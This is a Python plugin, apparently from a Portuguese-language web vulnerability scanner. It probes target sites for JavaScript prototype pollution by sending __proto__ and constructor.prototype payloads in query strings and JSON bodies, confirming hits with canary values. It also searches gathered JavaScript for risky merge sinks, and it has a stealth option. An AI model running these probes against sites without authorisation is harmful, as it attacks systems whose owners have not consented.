#!/usr/bin/env python3
"""
Prototype Pollution Detection (V10.3 Precision) — Detecta poluição de protótipos JavaScript.
Analisa sinks avançados, testa via query-string e JSON body, e realiza prova de conceito prática.
V10.3: httpx.Client reuse, dedup de resultados, URL normalization.
"""
import json
import time
import re
import uuid
import httpx
from pathlib import Path
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from concurrent.futures import ThreadPoolExecutor, as_completed

from core.config import DEFAULT_USER_AGENT, REQUEST_DELAY, DEFAULT_TIMEOUT
from menu import C
from plugins import ensure_outdir
from ..output import info, success, warn, error
from ..http_utils import format_http_request, format_http_response

# Padrões Pro (V10.1) — Sinks avançados
JS_SINK_PATTERNS = [
    (r"Object\.assign\s*\(", "Object.assign"),
    (r"_\.merge\s*\(", "lodash.merge"),
    (r"Object\.defineProperty\s*\(", "Object.defineProperty"),
    (r"JSON\.parse\s*\(", "JSON.parse sink"),
    (r"__proto__", "__proto__ ref"),
]

# V10.2: Sinks adicionais
JS_SINK_PATTERNS_V10_2 = [
    (r"\$\.extend\s*\(", "jQuery.extend"),
    (r"_\.defaultsDeep\s*\(", "lodash.defaultsDeep"),
    (r"_\.set\s*\(", "lodash.set"),
    (r"deepmerge\s*\(", "deepmerge"),
    (r"merge\s*\(\s*\{", "generic merge"),
    (r"Object\.create\s*\(", "Object.create"),
    (r"Reflect\.set\s*\(", "Reflect.set"),
    (r"\.constructor\s*\[", "constructor bracket access"),
]

def _test_pollution(client: httpx.Client, url: str) -> list:
    """Testa payloads de prototype pollution com prova de conceito prática. Reutiliza sessão.
    V10.5: Redirect validation, second-shot confirmation, baseline hash."""
    import hashlib

    findings = []
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    if not qs: return []

    # V10.2: Baseline check para reduzir FP
    try:
        baseline_resp = client.get(url, headers={"User-Agent": DEFAULT_USER_AGENT})
        baseline_body = baseline_resp.text.lower()
        baseline_hash = hashlib.sha256(baseline_body.encode(errors='ignore')).hexdigest()
        baseline_url = str(baseline_resp.url)  # V10.5: URL final após redirects
    except Exception:
        return []

    # V10.4: Canary único por teste (UUID4) para evitar FPs de echo
    canary = f"allma_{uuid.uuid4().hex[:12]}"

    # Payloads V10.1 + V10.2 + V10.4 (canary dinâmico)
    payloads = [
        ("__proto__[polluted]", canary),
        ("constructor[prototype][polluted]", canary),
        ("__proto__[toString]", f"{canary}_override"),
        ("__proto__[constructor][prototype][polluted]", canary),
        ("constructor.prototype.polluted", canary),
        ("__proto__[hasOwnProperty]", f"{canary}_hop"),
        ("__proto__[valueOf]", f"{canary}_valueof"),
    ]

    for p_key, p_val in payloads:
        time.sleep(REQUEST_DELAY)
        test_qs = qs.copy()
        test_qs[p_key] = [p_val]
        new_query = urlencode(test_qs, doseq=True)
        test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))

        try:
            resp = client.get(test_url, headers={"User-Agent": DEFAULT_USER_AGENT})
            body = resp.text.lower()
            final_url = str(resp.url)
            
            if resp.status_code >= 400:
                continue

            # V10.5: Ignorar se redirect para URL significativamente diferente
            if urlparse(final_url).netloc != urlparse(url).netloc:
                continue  # Redirect cross-domain = FP

            # V10.5: Ignorar se body é idêntico ao baseline (redirect para mesma página)
            resp_hash = hashlib.sha256(body.encode(errors='ignore')).hexdigest()
            if resp_hash == baseline_hash:
                continue

            is_vuln = False
            reason = ""
            
            if p_val.lower() in body and p_val.lower() not in baseline_body:
                # V10.4: Verificar que o canary aparece FORA da query string echoada
                body_cleaned = body
                import urllib.parse
                for qk, qv_list in test_qs.items():
                    for qv in qv_list:
                        # Clean raw format
                        body_cleaned = body_cleaned.replace(f"{qk.lower()}={qv.lower()}", "")
                        body_cleaned = body_cleaned.replace(f"{qk.lower()}%3d{qv.lower()}", "")
                        # Clean url encoded format (like %5B instead of [)
                        qk_enc = urllib.parse.quote(qk).lower()
                        qv_enc = urllib.parse.quote(qv).lower()
                        body_cleaned = body_cleaned.replace(f"{qk_enc}={qv_enc}", "")
                        body_cleaned = body_cleaned.replace(f"{qk_enc}%3d{qv_enc}", "")
                        # Clean encoded value but raw key
                        body_cleaned = body_cleaned.replace(f"{qk.lower()}={qv_enc}", "")

                
                if p_val.lower() in body_cleaned:
                    # V10.5: Second-shot confirmation com canary diferente
                    canary2 = f"allma_{uuid.uuid4().hex[:12]}"
                    test_qs2 = qs.copy()
                    test_qs2[p_key] = [canary2]
                    new_query2 = urlencode(test_qs2, doseq=True)
                    test_url2 = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query2, parsed.fragment))
                    
                    try:
                        resp2 = client.get(test_url2, headers={"User-Agent": DEFAULT_USER_AGENT})
                        body2 = resp2.text.lower()
                        # Limpar echo de query string no segundo test
                        for qk2, qv2_list in test_qs2.items():
                            for qv2 in qv2_list:
                                body2 = body2.replace(f"{qk2.lower()}={qv2.lower()}", "")
                                body2 = body2.replace(f"{qk2.lower()}%3d{qv2.lower()}", "")
                                qk2_enc = urllib.parse.quote(qk2).lower()
                                qv2_enc = urllib.parse.quote(qv2).lower()
                                body2 = body2.replace(f"{qk2_enc}={qv2_enc}", "")
                                body2 = body2.replace(f"{qk2_enc}%3d{qv2_enc}", "")
                                body2 = body2.replace(f"{qk2.lower()}={qv2_enc}", "")
                        
                        if canary2.lower() in body2:
                            is_vuln = True
                            reason = f"Poluição CONFIRMADA (double-shot): Valor injetado via '{p_key}' aparece fora de query echo em ambos os testes"
                    except Exception:
                        pass
                    
                    if not is_vuln:
                        continue  # Primeiro hit mas sem confirmação = provável FP

            if is_vuln:
                # Extrair snippet visual da primeira resposta para comprovação
                idx = body.find(p_val.lower())
                start = max(0, idx - 40)
                end = min(len(body), idx + len(p_val) + 40)
                snippet = body[start:end].replace('\n', ' ').strip()
                
                findings.append({
                    "url": url,
                    "test_url": test_url,
                    "type": "PROTOTYPE_POLLUTION",
                    "risk": "HIGH",
                    "confirmed": True,
                    "details": reason + f"<br><b>Snippet Mágico:</b> <code>...{snippet}...</code>",
                    "payload": f"{p_key}={p_val}",
                    "request_raw": format_http_request(resp.request),
                    "response_raw": format_http_response(resp),
                })
                break
        except Exception:
            pass
    return findings


def _test_pollution_json(client: httpx.Client, url: str) -> list:
    """V10.2: Testa prototype pollution via JSON body em endpoints API. Reutiliza sessão."""
    findings = []
    
    # V10.4: Canary único por teste
    canary = f"allma_{uuid.uuid4().hex[:12]}_json"
    
    json_payloads = [
        {"__proto__": {"polluted": canary}},
        {"constructor": {"prototype": {"polluted": canary}}},
    ]
    
    for payload in json_payloads:
        time.sleep(REQUEST_DELAY)
        try:
            resp = client.post(
                url,
                json=payload,
                headers={"User-Agent": DEFAULT_USER_AGENT, "Content-Type": "application/json"}
            )
            body = resp.text.lower()
            
            if canary in body and resp.status_code < 400:
                idx = body.find(canary)
                start = max(0, idx - 40)
                end = min(len(body), idx + len(canary) + 40)
                snippet = body[start:end].replace('\n', ' ').strip()
                
                findings.append({
                    "url": url,
                    "type": "PROTOTYPE_POLLUTION",
                    "risk": "HIGH",
                    "method": "POST (JSON)",
                    "details": f"Prototype Pollution via JSON body: valor injetado refletido no response.<br><b>Snippet Mágico:</b> <code>...{snippet}...</code>",
                    "payload": json.dumps(payload),
                    "request_raw": format_http_request(resp.request),
                    "response_raw": format_http_response(resp),
                })
                return findings  # Um achado por URL basta
        except Exception:
            pass
    return findings


def _scan_js_sinks(target: str) -> list:
    """Análise estática de JS para mapear potenciais sinks."""
    js_dir = Path("output") / target / "jsscanner"
    hints = []
    js_analysis_file = js_dir / "js_analysis.json"
    
    all_patterns = JS_SINK_PATTERNS + JS_SINK_PATTERNS_V10_2
    
    if js_analysis_file.exists():
        try:
            js_data = json.loads(js_analysis_file.read_text())
            for url, content in js_data.items():
                content_str = str(content)
                for pattern, name in all_patterns:
                    if re.search(pattern, content_str):
                        hints.append({
                            "url": url,
                            "type": "JS_SINK_DETECTED",
                            "risk": "MEDIUM",
                            "details": f"Sink vulnerável detectado em JS: '{name}'",
                            "sink": name
                        })
        except: pass
    return hints

def run(context: dict):
    target = context.get("target")
    stealth = context.get("stealth", False)
    deep = context.get("deep", False)
    if not target:
        raise ValueError("Target required")

    info(f"🧪 {C.BOLD}{C.CYAN}PROTOTYPE POLLUTION SCANNER (V10.3 PRECISION){C.END}")
    outdir = ensure_outdir(target, "prototype_pollution")

    # 1. Static
    js_hints = _scan_js_sinks(target)
    
    # 2. Dynamic (Query String)
    urls_file = Path("output") / target / "urls" / "urls_200.txt"
    candidates = []
    if urls_file.exists():
        urls = [l.strip() for l in urls_file.read_text().splitlines() if l.strip()]
        candidates = [u for u in urls if "?" in u and target in u]
    
    # V10.3: Dedup URLs
    candidates = list(set(u.rstrip("/") for u in candidates))[:80]
    max_workers = 3 if stealth else 10
    
    param_results = []
    found_urls = set()  # V10.3: Dedup resultados
    
    # V10.6: Thread-safe client — um client por thread via threading.local()
    import threading
    _thread_local = threading.local()
    
    def _get_thread_client():
        if not hasattr(_thread_local, "client"):
            _thread_local.client = httpx.Client(timeout=DEFAULT_TIMEOUT, verify=False, follow_redirects=True)
        return _thread_local.client
    
    def _test_pollution_safe(url):
        client = _get_thread_client()
        return _test_pollution(client, url)
    
    def _test_pollution_json_safe(url):
        client = _get_thread_client()
        return _test_pollution_json(client, url)
    
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {executor.submit(_test_pollution_safe, url): url for url in candidates}
        for future in as_completed(futures):
            res = future.result()
            if res:
                for f in res:
                    if f["url"] not in found_urls:
                        found_urls.add(f["url"])
                        param_results.append(f)
                        info(f"   🔴 {C.RED}[POLLUTION]{C.END} Confirmado em {f['url']}")

    # 3. V10.2: Dynamic (JSON Body) — somente deep mode
    json_results = []
    if deep:
        info(f"   🔎 [DEEP] Testando Prototype Pollution via JSON body...")
        api_candidates = []
        if urls_file.exists():
            urls = [l.strip() for l in urls_file.read_text().splitlines() if l.strip()]
            api_candidates = [u for u in urls if any(kw in u.lower() for kw in ["/api/", "/graphql", "/rest/", "/v1/", "/v2/"])]
        
        api_candidates = list(set(u.rstrip("/") for u in api_candidates))[:30]
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = {executor.submit(_test_pollution_json_safe, url): url for url in api_candidates}
            for future in as_completed(futures):
                res = future.result()
                if res:
                    for f in res:
                        if f["url"] not in found_urls:
                            found_urls.add(f["url"])
                            json_results.append(f)
                            info(f"   🔴 {C.RED}[POLLUTION JSON]{C.END} Confirmado em {f['url']}")

    all_results = param_results + json_results + js_hints
    output_file = outdir / "prototype_pollution_results.json"
    output_file.write_text(json.dumps(all_results, indent=2))
    
    # V10.3: Summary
    summary = {"urls_tested": len(candidates), "findings": len(param_results) + len(json_results), "js_sinks": len(js_hints), "status": "COMPLETED"}
    (outdir / "scan_summary.json").write_text(json.dumps(summary, indent=2))
    
    success(f"   📂 Resultados salvos em {output_file}")
    return all_results
